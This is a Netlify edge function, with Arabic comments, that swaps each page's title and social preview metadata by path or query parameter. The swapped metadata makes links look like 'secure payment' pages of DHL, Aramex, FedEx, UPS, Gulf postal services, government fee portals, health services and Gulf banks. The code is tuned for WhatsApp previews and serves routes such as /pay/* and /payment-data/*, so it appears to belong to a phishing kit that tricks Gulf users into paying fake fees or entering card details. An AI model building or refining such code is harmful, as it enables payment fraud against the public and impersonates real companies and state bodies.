import { Context } from "https://edge.netlify.com";

const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍",
    image: "/og-dhl.jpg"
  },
  dhlkw: {
    title: "دفع آمن - DHL الكويت ⚡",
    description: "DHL الكويت - خدمات شحن سريعة وموثوقة في الكويت - أكمل دفعتك بأمان للحصول على توصيل سريع 🇰🇼",
    image: "/og-dhl.jpg"
  },
  dhlqa: {
    title: "دفع آمن - DHL قطر ⚡",
    description: "DHL قطر - خدمات شحن سريعة وموثوقة في قطر - أكمل دفعتك بأمان للحصول على توصيل سريع 🇶🇦",
    image: "/og-dhl.jpg"
  },
  dhlom: {
    title: "دفع آمن - DHL عُمان ⚡",
    description: "DHL عُمان - خدمات شحن سريعة وموثوقة في عُمان - أكمل دفعتك بأمان للحصول على توصيل سريع 🇴🇲",
    image: "/og-dhl.jpg"
  },
  dhlbh: {
    title: "دفع آمن - DHL البحرين ⚡",
    description: "DHL البحرين - خدمات شحن سريعة وموثوقة في البحرين - أكمل دفعتك بأمان للحصول على توصيل سريع 🇧🇭",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰",
    image: "/og-fedex.jpg"
  },
  ups: {
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍",
    image: "/og-ups.jpg"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦",
    image: "/og-smsa.jpg"
  },
  naqel: {
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡",
    image: "/og-naqel.jpg"
  },
  zajil: {
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦",
    image: "/og-zajil.jpg"
  },
  saudipost: {
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦",
    image: "/og-saudipost.jpg"
  },
  empost: {
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨",
    image: "/og-empost.jpg"
  },
  qpost: {
    title: "دفع آمن - البريد القطري 🇶🇦",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍",
    image: "/og-qpost.jpg"
  },
  kwpost: {
    title: "دفع آمن - البريد الكويتي 🇰🇼",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅",
    image: "/og-kwpost.jpg"
  },
  omanpost: {
    title: "دفع آمن - البريد العُماني 🇴🇲",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮",
    image: "/og-omanpost.jpg"
  },
  bahpost: {
    title: "دفع آمن - البريد البحريني 🇧🇭",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨",
    image: "/og-bahpost.jpg"
  },
  albaraka: {
    title: "دفع آمن - البركة للشحن 🚚",
    description: "البركة - خدمات شحن احترافية في الخليج - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة وموثوقة",
    image: "/og-albaraka.jpg"
  },
  alfuttaim: {
    title: "دفع آمن - الفطيم اللوجستية 📦",
    description: "الفطيم - حلول لوجستية متكاملة - ادفع بأمان واحصل على خدمات شحن احترافية في جميع أنحاء المنطقة",
    image: "/og-alfuttaim.jpg"
  },
  alshaya: {
    title: "دفع آمن - الشايع للشحن 🚛",
    description: "الشايع - خدمات شحن وتوصيل موثوقة - أكمل دفعتك بأمان للحصول على خدمات لوجستية متطورة",
    image: "/og-alshaya.jpg"
  },
  bahri: {
    title: "دفع آمن - البحري للشحن البحري ⚓",
    description: "البحري - الشحن البحري الاحترافي - ادفع بأمان للحصول على خدمات شحن بحري موثوقة",
    image: "/og-bahri.jpg"
  },
  shipco: {
    title: "دفع آمن - شبكو للشحن 🚢",
    description: "شبكو - خدمات شحن بحري ولوجستية - أكمل الدفع بأمان للحصول على حلول شحن احترافية",
    image: "/og-shipco.jpg"
  },
  hellmann: {
    title: "دفع آمن - هيلمان اللوجستية 📦",
    description: "هيلمان - حلول لوجستية عالمية - ادفع بأمان واحصل على خدمات شحن دولية متطورة",
    image: "/og-hellmann.jpg"
  },
  dsv: {
    title: "دفع آمن - DSV اللوجستية 🌐",
    description: "DSV - شبكة لوجستية عالمية - أكمل دفعتك بأمان للحصول على خدمات شحن احترافية في جميع أنحاء العالم",
    image: "/og-dsv.jpg"
  },
  genacom: {
    title: "دفع آمن - جيناكوم للشحن 🚚",
    description: "جيناكوم - خدمات شحن وتوصيل سريعة - ادفع بأمان واحصل على خدمات توصيل موثوقة",
    image: "/og-genacom.jpg"
  },
  jinaken: {
    title: "دفع آمن - جينا كن للتوصيل 🏠",
    description: "جينا كن - خدمات توصيل محلية سريعة - أكمل الدفع بأمان للحصول على توصيل سريع لمنزلك",
    image: "/og-jinaken.jpg"
  },
  jinakum: {
    title: "دفع آمن - جينا كم للتوصيل 🏠",
    description: "جينا كم - خدمات توصيل محلية موثوقة - ادفع بأمان واحصل على توصيل سريع وآمن",
    image: "/og-jinakum.jpg"
  },
  chalets: {
    title: "دفع آمن - حجز الشاليهات والاستراحات 🏖️",
    description: "حجز شاليهات فاخرة واستراحات مريحة - ادفع بأمان واحجز إقامتك المثالية مع عروض حصرية وخدمات متميزة في جميع أنحاء الخليج 🌟",
    image: "/og-chalets.jpg"
  },
  contracts: {
    title: "دفع آمن - العقود والاتفاقيات القانونية 📄",
    description: "تسديد العقود والاتفاقيات - أكمل دفعتك بأمان للعقود العقارية والتجارية والخدمية مع حماية قانونية كاملة وموثقة ✅",
    image: "/og-contracts.jpg"
  },
  invoices: {
    title: "دفع آمن - الفواتير والمستحقات 📋",
    description: "دفع الفواتير إلكترونياً - سدد فواتيرك ومستحقاتك بكل سهولة وأمان مع تأكيد فوري ومتابعة دقيقة لجميع معاملاتك المالية 💰",
    image: "/og-invoices.jpg"
  },
  government_payment: {
    title: "دفع آمن - الخدمات الحكومية 🏛️",
    description: "دفع الخدمات والرسوم الحكومية - سدد رسومك الحكومية إلكترونياً بأمان تام مع سداد، بنفت، مدى وجميع أنظمة الدفع الحكومية المعتمدة ✅",
    image: "/og-government_payment.jpg"
  },
  health_links: {
    title: "دفع آمن - الخدمات الصحية والطبية 🏥",
    description: "دفع الخدمات الصحية والطبية - سدد فواتيرك الطبية، التأمين الصحي، والمستشفيات بأمان مع تأكيد فوري وخصوصية تامة 🩺",
    image: "/og-health_links.jpg"
  },
  local_payment: {
    title: "دفع آمن - المدفوعات المحلية 💳",
    description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
    image: "/og-local_payment.jpg"
  },
  bank_pages: {
    title: "دفع آمن - البنوك الخليجية 🏦",
    description: "الدفع عبر البنوك الخليجية - اختر بنكك المفضل من أكثر من 50 بنك خليجي وأكمل معاملتك المالية بأمان وسرعة فائقة 💎",
    image: "/og-bank_pages.jpg"
  },
  default: {
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان وسهولة تامة",
    image: "/og-aramex.jpg"
  }
};

export default async (request: Request, context: Context) => {
  try {
    const url = new URL(request.url);
    
    // إزالة فحص Accept header - WhatsApp crawler قد لا يرسله!
    // نعتمد فقط على Content-Type من الـ response
    
    const response = await context.next();
    const contentType = response.headers.get("content-type") || "";
    
    if (!contentType.includes("text/html")) {
      return response;
    }

    let html = await response.text();

    // استخراج company من Path Parameters أولاً (دعم /p/:id/:company/:currency/:amount)
    const pathParts = url.pathname.split('/');
    let pathCompany = null;
    
    // إذا كان المسار /p/xxx/company/currency/amount
    if (pathParts[1] === 'p' && pathParts.length >= 3) {
      pathCompany = pathParts[3]; // /p/id/company/...
    }
    
    // الأولوية: Path Parameters > Query Parameters
    const companyParam = pathCompany || url.searchParams.get("company") || url.searchParams.get("c") || url.searchParams.get("service") || "default";
    const meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
    
    // GitHub CDN - موثوق 100% لحل مشكلة WhatsApp cache
    const fullImageUrl = meta.image.startsWith('http') ? meta.image : meta.image;
    const fullUrl = url.href;

    // تم إزالة console.log للـ production

    const metaUpdates = [
      { pattern: /<title>[^<]*<\/title>/gi, replacement: `<title>${meta.title}</title>` },
      { pattern: /<meta\s+name="description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="description" content="${meta.description}"/>` },
      { pattern: /<meta\s+property="og:title"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:title" content="${meta.title}"/>` },
      { pattern: /<meta\s+property="og:description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:description" content="${meta.description}"/>` },
      { pattern: /<meta\s+property="og:image"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image" content="${fullImageUrl}"/>` },
      { pattern: /<meta\s+property="og:url"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:url" content="${fullUrl}"/>` },
      { pattern: /<meta\s+property="og:image:secure_url"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image:secure_url" content="${fullImageUrl}"/>` },
      { pattern: /<meta\s+property="og:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image:alt" content="${meta.title}"/>` },
      { pattern: /<meta\s+name="twitter:title"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:title" content="${meta.title}"/>` },
      { pattern: /<meta\s+name="twitter:description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:description" content="${meta.description}"/>` },
      { pattern: /<meta\s+name="twitter:image"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image" content="${fullImageUrl}"/>` },
      { pattern: /<meta\s+name="twitter:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image:alt" content="${meta.title}"/>` },
    ];

    for (const update of metaUpdates) {
      html = html.replace(update.pattern, update.replacement);
    }

    // إضافة og:type إذا لم يكن موجود (مهم لـ WhatsApp)
    if (!html.includes('property="og:type"') && !html.includes("property='og:type'")) {
      html = html.replace(
        /<head>/i,
        `<head>\n    <meta property="og:type" content="website"/>`
      );
    }

    if (!html.includes('property="og:url"') && !html.includes("property='og:url'")) {
      html = html.replace(
        /<head>/i,
        `<head>\n    <meta property="og:url" content="${fullUrl}"/>`
      );
    }

    if (!html.includes('property="og:image:secure_url"') && !html.includes("property='og:image:secure_url'")) {
      html = html.replace(
        /<meta property="og:image"/i,
        `<meta property="og:image:secure_url" content="${fullImageUrl}"/>\n    <meta property="og:image"`
      );
    }

    // إضافة image dimensions لـ WhatsApp (مهم لعرض صحيح)
    if (!html.includes('property="og:image:width"') && !html.includes("property='og:image:width'")) {
      html = html.replace(
        /<meta property="og:image"/i,
        `<meta property="og:image:width" content="1200"/>\n    <meta property="og:image:height" content="630"/>\n    <meta property="og:image:type" content="image/jpeg"/>\n    <meta property="og:image"`
      );
    }

    return new Response(html, {
      headers: {
        "content-type": "text/html; charset=utf-8",
        // منع Cache بشكل صارم - مهم لـ WhatsApp
        "cache-control": "no-cache, no-store, must-revalidate, max-age=0, s-maxage=0",
        "pragma": "no-cache",
        "expires": "0",
        // Headers إضافية للتوافق
        "x-dynamic-meta": companyParam,
        "x-robots-tag": "index, follow",
        "vary": "User-Agent"
      }
    });
  } catch (error) {
    // تم إزالة console.error للـ production - error logging في Netlify dashboard
    return context.next();
  }
};

export const config = {
  path: ["/", "/r/*", "/p/*", "/pay/*", "/payment-data/*", "/recipient/*"],
};